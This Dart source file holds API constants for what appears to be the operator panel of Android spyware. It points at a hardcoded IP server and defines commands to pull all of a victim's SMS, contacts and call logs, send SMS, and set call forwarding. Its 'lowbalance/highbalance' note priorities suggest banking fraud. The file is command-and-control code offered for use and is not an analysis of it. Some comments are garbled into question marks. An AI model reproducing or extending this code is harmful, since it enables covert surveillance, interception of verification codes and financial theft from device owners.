class ApiConstants {
  // Base URL
  static const String baseUrl = 'http://95.134.130.160:8765';

  // ===================================
  // ?? Authentication
  // ===================================
  static const String login = '/auth/login';
  static const String logout = '/auth/logout';
  static const String me = '/auth/me';

  // ===================================
  // ?? Statistics
  // ===================================
  static const String stats = '/api/stats';

  // ===================================
  // ?? Devices
  // ===================================
  static const String devices = '/api/devices';
  static String deviceDetail(String deviceId) => '/api/devices/$deviceId';
  static String deviceSms(String deviceId) => '/api/devices/$deviceId/sms';
  static String deviceContacts(String deviceId) => '/api/devices/$deviceId/contacts';
  static String deviceCalls(String deviceId) => '/api/devices/$deviceId/calls';
  static String deviceLogs(String deviceId) => '/api/devices/$deviceId/logs';
  static String deviceCommand(String deviceId) => '/api/devices/$deviceId/command';
  static String deviceSettings(String deviceId) => '/api/devices/$deviceId/settings';
  
  // Delete device data
  static String deleteDeviceSms(String deviceId) => '/api/devices/$deviceId/sms';
  static String deleteDeviceContacts(String deviceId) => '/api/devices/$deviceId/contacts';
  static String deleteDeviceCalls(String deviceId) => '/api/devices/$deviceId/calls';

  // ===================================
  // ?? Admin Management
  // ===================================
  static const String adminCreate = '/admin/create';
  static const String adminList = '/admin/list';
  static String adminUpdate(String username) => '/admin/$username';
  static String adminDelete(String username) => '/admin/$username';
  static String adminDetail(String username) => '/admin/$username';
  
  // Change password
  static const String adminChangePassword = '/admin/change-password';

  // ===================================
  // ?? Admin Activities
  // ===================================
  static const String adminActivities = '/admin/activities';
  static const String adminActivitiesStats = '/admin/activities/stats';

  // ===================================
  // ?? Health Check
  // ===================================
  static const String health = '/health';

  // ===================================
  // ?? Firebase Commands (?? ???? deviceCommand)
  // ===================================
  // ??? commands ?? ???? /api/devices/{device_id}/command ????? ????
  // ??? ????? command ? parameters ???????
  
  /// Ping Command
  /// parameters: {"type": "firebase"}
  static const String commandPing = 'ping';
  
  /// Send SMS Command
  /// parameters: {"phone": "...", "message": "...", "simSlot": 0}
  static const String commandSendSms = 'send_sms';
  
  /// Call Forwarding Commands
  /// Enable: parameters: {"number": "...", "simSlot": 0}
  /// Disable: parameters: {"simSlot": 0}
  static const String commandCallForwarding = 'call_forwarding';
  static const String commandCallForwardingDisable = 'call_forwarding_disable';
  
  /// Quick Upload Commands (50 items)
  static const String commandQuickUploadSms = 'quick_upload_sms';
  static const String commandQuickUploadContacts = 'quick_upload_contacts';
  
  /// Full Upload Commands (all items)
  static const String commandUploadAllSms = 'upload_all_sms';
  static const String commandUploadAllContacts = 'upload_all_contacts';
  
  /// Note Command
  /// parameters: {"priority": "lowbalance|highbalance|none", "message": "..."}
  static const String commandNote = 'note';

  // ===================================
  // ?? Device Registration & Updates
  // ===================================
  static const String register = '/register';
  static const String deviceHeartbeat = '/devices/heartbeat';
  static const String pingResponse = '/ping-response';
  static const String uploadResponse = '/upload-response';
  
  // Batch uploads
  static const String smsBatch = '/sms/batch';
  static const String contactsBatch = '/contacts/batch';
  static const String callLogsBatch = '/call-logs/batch';
  
  // New SMS
  static const String smsNew = '/api/sms/new';
  
  // Get forwarding number
  static String getForwardingNumber(String deviceId) => '/api/getForwardingNumber/$deviceId';

  // ===================================
  // ?? Helper Methods
  // ===================================
  
  /// Send command to device
  /// Usage: POST to deviceCommand(deviceId) with body:
  /// {"command": "ping", "parameters": {"type": "firebase"}}
  static Map<String, dynamic> buildCommand(String command, {Map<String, dynamic>? parameters}) {
    return {
      'command': command,
      'parameters': parameters ?? {},
    };
  }

  /// Build Ping Command
  static Map<String, dynamic> buildPingCommand({String type = 'firebase'}) {
    return buildCommand(commandPing, parameters: {'type': type});
  }

  /// Build SMS Command
  static Map<String, dynamic> buildSmsCommand(String phone, String message, {int simSlot = 0}) {
    return buildCommand(commandSendSms, parameters: {
      'phone': phone,
      'message': message,
      'simSlot': simSlot,
    });
  }

  /// Build Call Forwarding Command
  static Map<String, dynamic> buildCallForwardingCommand(String number, {int simSlot = 0}) {
    return buildCommand(commandCallForwarding, parameters: {
      'number': number,
      'simSlot': simSlot,
    });
  }

  /// Build Call Forwarding Disable Command
  static Map<String, dynamic> buildCallForwardingDisableCommand({int simSlot = 0}) {
    return buildCommand(commandCallForwardingDisable, parameters: {
      'simSlot': simSlot,
    });
  }

  /// Build Quick Upload SMS Command
  static Map<String, dynamic> buildQuickUploadSmsCommand() {
    return buildCommand(commandQuickUploadSms);
  }

  /// Build Quick Upload Contacts Command
  static Map<String, dynamic> buildQuickUploadContactsCommand() {
    return buildCommand(commandQuickUploadContacts);
  }

  /// Build Upload All SMS Command
  static Map<String, dynamic> buildUploadAllSmsCommand() {
    return buildCommand(commandUploadAllSms);
  }

  /// Build Upload All Contacts Command
  static Map<String, dynamic> buildUploadAllContactsCommand() {
    return buildCommand(commandUploadAllContacts);
  }

  /// Build Note Command
  static Map<String, dynamic> buildNoteCommand(String priority, String message) {
    return buildCommand(commandNote, parameters: {
      'priority': priority,
      'message': message,
    });
  }
}

/// Activity Types for Admin Activities
class ActivityType {
  static const String login = 'login';
  static const String logout = 'logout';
  static const String viewDevice = 'view_device';
  static const String viewSms = 'view_sms';
  static const String viewContacts = 'view_contacts';
  static const String sendCommand = 'send_command';
  static const String deleteData = 'delete_data';
  static const String createAdmin = 'create_admin';
  static const String updateAdmin = 'update_admin';
  static const String deleteAdmin = 'delete_admin';
  static const String changeSettings = 'change_settings';

  static String getDisplayName(String type) {
    switch (type) {
      case login:
        return 'Login';
      case logout:
        return 'Logout';
      case viewDevice:
        return 'View Device';
      case viewSms:
        return 'View SMS';
      case viewContacts:
        return 'View Contacts';
      case sendCommand:
        return 'Send Command';
      case deleteData:
        return 'Delete Data';
      case createAdmin:
        return 'Create Admin';
      case updateAdmin:
        return 'Update Admin';
      case deleteAdmin:
        return 'Delete Admin';
      case changeSettings:
        return 'Change Settings';
      default:
        return type;
    }
  }
}
